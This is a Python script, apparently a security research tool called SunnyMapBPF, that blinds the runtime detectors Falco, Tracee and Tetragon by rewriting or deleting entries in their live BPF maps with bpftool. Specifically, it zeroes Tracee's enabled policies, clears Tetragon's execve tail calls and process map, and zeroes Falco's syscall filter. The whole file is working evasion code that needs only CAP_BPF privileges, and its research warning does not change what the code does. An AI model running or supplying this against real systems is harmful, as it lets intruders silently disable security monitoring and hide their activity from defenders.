#!/usr/bin/env python3
"""
SunnyMapBPF — BPF Map Poisoner (Research Tool)

Implements the BPF Map Poisoning attack primitives against Falco, Tracee,
and Tetragon for controlled security research and testing.

WARNING: This tool modifies live BPF maps. Use only in controlled test
environments. Never run against production systems.

Requires: CAP_BPF or CAP_SYS_ADMIN
Usage: sudo python3 map_poisoner.py --tool tracee --attack blindness
"""

import subprocess
import json
import sys
import argparse
import time


def run_bpftool(*args, raw=False):
    cmd = ["bpftool"] + list(args)
    if not raw:
        cmd.append("-j")
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        return None
    if raw:
        return result.stdout
    return json.loads(result.stdout)


def find_map_by_name(name, map_type=None):
    maps = run_bpftool("map", "list")
    if not maps:
        return None
    for m in maps:
        if name in m.get("name", ""):
            if map_type is None or m.get("type") == map_type:
                return m
    return None


def read_map_value(map_id, key_hex):
    return run_bpftool("map", "lookup", "id", str(map_id), "key", "hex", *key_hex.split())


def update_map_value(map_id, key_hex, value_hex):
    cmd = f"bpftool map update id {map_id} key hex {key_hex} value hex {value_hex}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.returncode == 0


def delete_map_entry(map_id, key_hex):
    cmd = f"bpftool map delete id {map_id} key hex {key_hex}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.returncode == 0


def delete_pinned_entry(path, key_hex):
    cmd = f"bpftool map delete pinned {path} key hex {key_hex}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.returncode == 0


# ─── Tracee Attacks ───

def tracee_blindness():
    """Zero enabled_policies in config_map to make Tracee completely blind."""
    config_map = find_map_by_name("config_map", "array")
    if not config_map:
        print("ERROR: config_map not found", file=sys.stderr)
        return False

    map_id = config_map["id"]
    print(f"[*] Found config_map: ID={map_id}")

    data = run_bpftool("map", "dump", "id", str(map_id))
    if not data:
        return False

    val = data[0]["value"]
    val_ints = [int(v, 16) if isinstance(v, str) else v for v in val]

    # Read current state (v0.24.x offsets)
    tracee_pid = int.from_bytes(bytes(val_ints[0:4]), "little")
    version = int.from_bytes(bytes(val_ints[14:16]), "little")
    enabled = int.from_bytes(bytes(val_ints[216:224]), "little")

    print(f"[*] Current: tracee_pid={tracee_pid}, version={version}, enabled_policies={enabled}")

    if enabled == 0:
        print("[!] enabled_policies already 0")
        return True

    # Zero enabled_policies
    for i in range(216, 224):
        val_ints[i] = 0

    # Bump version to invalidate per-CPU cache
    new_version = version + 1
    val_ints[14] = new_version & 0xFF
    val_ints[15] = (new_version >> 8) & 0xFF

    hex_val = " ".join(f"{b:02x}" for b in val_ints)
    if update_map_value(map_id, "00 00 00 00", hex_val):
        print(f"[+] Poisoned: enabled_policies=0, version={new_version}")
        return True

    print("[-] Map update failed", file=sys.stderr)
    return False


def tracee_restore():
    """Restore enabled_policies=1 in config_map."""
    config_map = find_map_by_name("config_map", "array")
    if not config_map:
        return False

    map_id = config_map["id"]
    data = run_bpftool("map", "dump", "id", str(map_id))
    if not data:
        return False

    val = data[0]["value"]
    val_ints = [int(v, 16) if isinstance(v, str) else v for v in val]

    val_ints[216] = 1
    for i in range(217, 224):
        val_ints[i] = 0
    val_ints[14] = 1
    val_ints[15] = 0

    hex_val = " ".join(f"{b:02x}" for b in val_ints)
    if update_map_value(map_id, "00 00 00 00", hex_val):
        print("[+] Restored: enabled_policies=1, version=1")
        return True
    return False


# ─── Tetragon Attacks ───

TETRAGON_BPF_PATH = "/sys/fs/bpf/tetragon"

def tetragon_blindness():
    """Delete execve_calls and clear execve_map for total Tetragon blindness."""
    execve_calls = f"{TETRAGON_BPF_PATH}/__base__/event_execve/execve_calls"
    execve_map = f"{TETRAGON_BPF_PATH}/execve_map"

    print("[*] Step 1: Deleting execve_calls tail call entries...")
    delete_pinned_entry(execve_calls, "00 00 00 00")
    delete_pinned_entry(execve_calls, "01 00 00 00")
    print("[+] execve_calls emptied")

    print("[*] Step 2: Clearing execve_map...")
    data = run_bpftool("map", "dump", "pinned", execve_map)
    if not data:
        print("[-] Failed to read execve_map")
        return False

    count = 0
    for entry in data:
        key = entry.get("key", [])
        key_hex = " ".join(
            (v.replace("0x", "") if isinstance(v, str) else f"{v:02x}")
            for v in key
        )
        if delete_pinned_entry(execve_map, key_hex):
            count += 1

    print(f"[+] Deleted {count} entries from execve_map")
    return True


# ─── Falco Attacks ───

def falco_blindness():
    """Zero all interesting_syscalls entries to make Falco completely blind."""
    isc_map = find_map_by_name("interesting_sys", "array")
    if not isc_map:
        print("ERROR: interesting_syscalls map not found", file=sys.stderr)
        return False

    map_id = isc_map["id"]
    max_entries = isc_map.get("max_entries", 512)
    print(f"[*] Found interesting_syscalls: ID={map_id}, max_entries={max_entries}")

    print(f"[*] Zeroing {max_entries} entries...")
    for i in range(max_entries):
        key = f"{i & 0xff:02x} {(i >> 8) & 0xff:02x} 00 00"
        update_map_value(map_id, key, "00")

    print(f"[+] All {max_entries} syscall entries zeroed")
    return True


ATTACKS = {
    "tracee": {
        "blindness": tracee_blindness,
        "restore": tracee_restore,
    },
    "tetragon": {
        "blindness": tetragon_blindness,
    },
    "falco": {
        "blindness": falco_blindness,
    },
}


def main():
    parser = argparse.ArgumentParser(
        description="SunnyMapBPF — BPF Map Poisoner",
        epilog="WARNING: Research tool only. Do not use on production systems."
    )
    parser.add_argument("--tool", required=True, choices=["tracee", "tetragon", "falco"])
    parser.add_argument("--attack", required=True, choices=["blindness", "restore"])
    parser.add_argument("--dry-run", action="store_true", help="Show what would be done without modifying maps")
    args = parser.parse_args()

    if args.dry_run:
        print(f"[DRY RUN] Would execute: {args.tool}/{args.attack}")
        return

    tool_attacks = ATTACKS.get(args.tool, {})
    attack_fn = tool_attacks.get(args.attack)

    if not attack_fn:
        print(f"Attack '{args.attack}' not available for {args.tool}", file=sys.stderr)
        sys.exit(1)

    print(f"[*] Executing {args.tool}/{args.attack}...")
    success = attack_fn()
    if success:
        print(f"[+] {args.tool}/{args.attack} completed successfully")
    else:
        print(f"[-] {args.tool}/{args.attack} failed")
        sys.exit(1)


if __name__ == "__main__":
    main()
